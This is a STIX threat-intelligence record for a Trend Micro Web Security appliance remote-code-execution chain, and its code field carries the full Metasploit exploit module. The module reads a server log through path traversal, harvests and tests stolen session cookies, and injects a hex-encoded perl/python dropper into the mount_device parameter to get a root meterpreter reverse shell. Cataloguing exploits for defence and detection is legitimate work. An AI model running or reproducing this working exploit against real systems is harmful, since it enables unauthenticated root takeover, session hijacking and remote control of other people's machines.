{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--26b828c8-8890-4759-baec-249ddefee0ad",
    "created": "2024-08-14T17:02:42.715387Z",
    "modified": "2024-08-14T17:02:42.715392Z",
    "name": "Trend Micro Web Security (Virtual Appliance) Remote Code Execution",
    "description": " This module exploits multiple vulnerabilities together in order to achive a remote code execution. Unauthenticated users can execute a terminal command under the context of the root user.  The specific flaw exists within the LogSettingHandler class of administrator interface software. When parsing the mount_device parameter, the process does not properly validate a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of root. But authentication is required to exploit this vulnerability.  Another specific flaw exist within the proxy service, which listens on port 8080 by default. Unauthenticated users can exploit this vulnerability in order to communicate with internal services in the product.  Last but not least a flaw exists within the Apache Solr application, which is installed within the product. When parsing the file parameter, the process does not properly validate a user-supplied path prior to using it in file operations. An attacker can leverage this vulnerability to disclose information in the context of the IWSS user.  Due to combination of these vulnerabilities, unauthenticated users can execute a terminal command under the context of the root user.  Version perior to 6.5 SP2 Patch 4 (Build 1901) are affected.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/trendmicro_websecurity_exec.rb",
            "external_id": "trendmicro_websecurity_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-8604"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-8605"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-8606"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Trend Micro Web Security (Virtual Appliance) Remote Code Execution',\n        'Description' => %q{\n          This module exploits multiple vulnerabilities together in order to achive a remote code execution.\n          Unauthenticated users can execute a terminal command under the context of the root user.\n\n          The specific flaw exists within the LogSettingHandler class of administrator interface software.\n          When parsing the mount_device parameter, the process does not properly validate a user-supplied string\n          before using it to execute a system call. An attacker can leverage this vulnerability to execute code in\n          the context of root. But authentication is required to exploit this vulnerability.\n\n          Another specific flaw exist within the proxy service, which listens on port 8080 by default. Unauthenticated users\n          can exploit this vulnerability in order to communicate with internal services in the product.\n\n          Last but not least a flaw exists within the Apache Solr application, which is installed within the product.\n          When parsing the file parameter, the process does not properly validate a user-supplied path prior to using it in file operations.\n          An attacker can leverage this vulnerability to disclose information in the context of the IWSS user.\n\n          Due to combination of these vulnerabilities, unauthenticated users can execute a terminal command under the context of the root user.\n\n          Version perior to 6.5 SP2 Patch 4 (Build 1901) are affected.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Mehmet Ince <mehmet@mehmetince.net>' # discovery & msf module\n        ],\n        'References' => [\n          ['CVE', '2020-8604'],\n          ['CVE', '2020-8605'],\n          ['CVE', '2020-8606'],\n          ['ZDI', '20-676'],\n          ['ZDI', '20-677'],\n          ['ZDI', '20-678']\n        ],\n        'Privileged' => true,\n        'DefaultOptions' => {\n          'SSL' => true,\n          'payload' => 'python/meterpreter/reverse_tcp',\n          'WfsDelay' => 30\n        },\n        'Payload' => {\n          'Compat' =>\n          {\n            'ConnectionType' => '-bind'\n          }\n        },\n        'Platform' => ['python'],\n        'Arch' => ARCH_PYTHON,\n        'Targets' => [ ['Automatic', {}] ],\n        'DisclosureDate' => '2020-06-10',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8443),\n        OptInt.new('PROXY_PORT', [true, 'Port number of Trend Micro Web Filter Proxy service', 8080])\n      ]\n    )\n  end\n\n  def hijack_cookie\n    # Updating SSL and RPORT in order to communicate with HTTP proxy service.\n    if datastore['SSL']\n      ssl_restore = true\n      datastore['SSL'] = false\n    end\n    port_restore = datastore['RPORT']\n    datastore['RPORT'] = datastore['PROXY_PORT']\n\n    @jsessionid = ''\n\n    # We are exploiting proxy service vulnerability in order to fetch content of catalina.out file\n    print_status('Trying to extract session ID by exploiting reverse proxy service')\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => \"http://#{datastore['RHOST']}:8983/solr/collection0/replication\",\n      'vars_get' => {\n        'command' => 'filecontent',\n        'wt' => 'filestream',\n        'generation' => 1,\n        'file' => '../' * 7 << 'var/iwss/tomcat/logs/catalina.out'\n      }\n    })\n\n    # Restore variables and validate extracted sessionid\n    datastore['SSL'] = true if ssl_restore\n    datastore['RPORT'] = port_restore\n\n    # Routine check on res object\n    unless res\n      fail_with(Failure::Unreachable, 'Target is unreachable.')\n    end\n\n    # If the res code is not 200 that means proxy service is not vulnerable.\n    unless res.code == 200\n      @jsessionid = -1\n      return\n    end\n\n    # Now we are going to extract all JESSIONID from log file and store them in array.\n    cookies = res.body.scan(/CheckUserLogon sessionid : (.*)/).flatten\n\n    if cookies.empty?\n      @jsessionid = 0\n      print_error('System is vulnerable, however a user session was not detected and is therefore unexploitable. Retry after a user logs in.')\n      return\n    end\n\n    print_good(\"Extracted number of JSESSIONID: #{cookies.length}\")\n\n    # We gotta switch back to adminsitrator interface port instead of proxy service. Restore rport and ssl variables.\n    datastore['SSL'] = true if ssl_restore\n    datastore['RPORT'] = port_restore\n\n    # Latest cookie in the log file is the one most probably active. So that we use reverse on array.\n    cookies.reverse.each_with_index do |cookie, index|\n      print_status(\"Testing JSESSIONID ##{index} : #{cookie}\")\n\n      # This endpoints is basically check session :)\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri('rest', 'commonlog', 'get_sessionID'),\n        'cookie' => \"JSESSIONID=#{cookie}\"\n      })\n\n      # Routine res check\n      unless res\n        fail_with(Failure::UnexpectedReply, 'Target is unreachable.')\n      end\n\n      # If the cookie is active !\n      if res.code == 200 && res.body.include?('session_flag')\n        print_good(\"Awesome!!! JESSIONID ##{index} is active.\")\n        @jsessionid = cookie\n        break\n      end\n\n      print_warning(\"JSESSIONID ##{index} is inactive! Moving to the next one.\")\n    end\n\n    if @jsessionid.empty?\n      print_error('System is vulnerable, however extracted cookies are not valid! Please wait for a user or admin to login.')\n    end\n  end\n\n  def check\n    #\n    # @jsessionid can be one of the following value\n    #\n    # -1 = Proxy service is not vulnerable, which means we'r not gonna\n    # be able to read catalina.out\n    #\n    # 0  = Proxy service is vulnerable, but catalina.out does not contain any\n    # jessionid string yet !\n    #\n    # empty = Proxy service is vulnerable, but jessionid within log file but\n    # none of them are valid:(\n    #\n    # string = Proxy service is vulnerable and sessionid is valid !\n    #\n    hijack_cookie\n\n    if @jsessionid == -1\n      CheckCode::Safe\n    else\n      CheckCode::Vulnerable\n    end\n  end\n\n  def exploit\n    unless check == CheckCode::Vulnerable\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    #\n    # 0     => Proxy service is vulnerable, but catalina.out does not contain any\n    # jessionid string yet !\n    #\n    # empty => Proxy service is vulnerable, but jessionid within log file but\n    # none of them are valid:(\n    #\n    if @jsessionid.empty? || @jessionid == 0\n      fail_with Failure::NoAccess, ''\n    end\n\n    print_status('Exploiting command injection vulnerability')\n\n    # Yet another app specific bypass is going on here.\n    # It's so buggy to make the cmd payloads work under the following circumstances (Weak blacklisting, double escaping etc)\n    # For that reason, I am planting our payload dropper within the perl command.\n\n    cmd = \"python -c \\\"#{payload.encoded}\\\"\"\n    final_payload = cmd.to_s.unpack1('H*')\n    p = \"perl -e 'system(pack(qq,H#{final_payload.length},,qq,#{final_payload},))'\"\n\n    vars_post = {\n      mount_device: \"mount $(#{p}) /var/offload\",\n      cmd: 'mount'\n    }\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'rest', 'commonlog', 'log_setting', 'mount_device'),\n      'cookie' => \"JSESSIONID=#{@jsessionid}\",\n      'ctype' => 'application/json',\n      'data' => vars_post.to_json\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-06-10",
    "x_mitre_platforms": [
        "['python']"
    ]
}